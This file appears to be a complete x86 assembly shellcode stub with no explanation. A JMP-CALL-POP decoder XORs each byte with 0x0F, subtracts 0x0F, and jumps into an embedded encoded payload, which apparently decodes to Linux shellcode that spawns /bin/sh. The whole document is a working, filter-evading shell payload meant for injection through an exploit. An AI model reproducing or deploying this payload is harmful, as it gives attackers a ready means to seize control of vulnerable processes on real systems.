global _start

section .text
_start:
	jmp call_decoder



decode:
	pop esi
	push esi ; for future refence

decoder:
	xor byte [esi], 0x0F
	jz after_decode
	sub byte [esi], 0xF
	inc esi
	jmp decoder

after_decode:
	pop esi 
	jmp esi
call_decoder:
	call decode
	encoded_shellcode db 0x4f,0xc0,0x50,0x78,0x31,0x31,0x8d,0x78,0x78,0x31,0x7e,0x77,0x72,0x97,0xfd,0x50,0x97,0xfe,0x6d,0x97,0xff,0xb0,0x15,0xd3,0x80,0x0f
